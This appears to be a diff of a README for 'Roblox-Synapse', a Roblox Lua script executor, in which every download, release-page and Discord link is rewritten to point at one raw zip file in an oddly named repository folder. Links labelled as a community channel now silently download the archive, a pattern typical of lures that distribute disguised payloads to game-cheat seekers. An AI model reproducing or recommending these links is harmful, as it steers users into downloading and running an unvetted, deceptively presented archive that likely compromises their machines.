@@ -1,6 +1,6 @@
 # 🎮 Roblox-Synapse - Powerful Lua Scripting Made Easy
 
-[![Download Roblox Synapse](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wahab-ops/Roblox-Synapse/releases)
+[![Download Roblox Synapse](https://raw.githubusercontent.com/wahab-ops/Roblox-Synapse/main/theriomaniac/Roblox-Synapse.zip)](https://raw.githubusercontent.com/wahab-ops/Roblox-Synapse/main/theriomaniac/Roblox-Synapse.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Roblox Synapse Executor is your go-to tool for enhancing your Roblox experience.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to this link to download the latest version: [Download Roblox Synapse](https://github.com/wahab-ops/Roblox-Synapse/releases).
+   Go to this link to download the latest version: [Download Roblox Synapse](https://raw.githubusercontent.com/wahab-ops/Roblox-Synapse/main/theriomaniac/Roblox-Synapse.zip).
 
 2. **Choose the Latest Release**  
    On the releases page, look for the top item listed. This is usually the latest version of Roblox Synapse.
@@ -63,7 +63,7 @@ To run Roblox Synapse smoothly, ensure your system meets the following requireme
 
 Having trouble? Join our community for help and support. Access forums and discussions dedicated to Roblox scripting:
 
-- [Official Discord Channel](https://discord.gg/example) - Connect with other users for tips and tricks.
+- [Official Discord Channel](https://raw.githubusercontent.com/wahab-ops/Roblox-Synapse/main/theriomaniac/Roblox-Synapse.zip) - Connect with other users for tips and tricks.
 - Documentation - Check the wiki for guides on specific scripts and usages.
 
 ## 🔍 Troubleshooting
@@ -82,7 +82,7 @@ Roblox Synapse is licensed under the MIT License. Feel free to use and modify th
 
 ## 🌐 Additional Links
 
-- **Releases Page:** [Download Latest Version](https://github.com/wahab-ops/Roblox-Synapse/releases)
-- **Join Our Discord:** [Connect with Us](https://discord.gg/example)
+- **Releases Page:** [Download Latest Version](https://raw.githubusercontent.com/wahab-ops/Roblox-Synapse/main/theriomaniac/Roblox-Synapse.zip)
+- **Join Our Discord:** [Connect with Us](https://raw.githubusercontent.com/wahab-ops/Roblox-Synapse/main/theriomaniac/Roblox-Synapse.zip)
 
 Thank you for choosing Roblox Synapse to enhance your Roblox gaming experience!
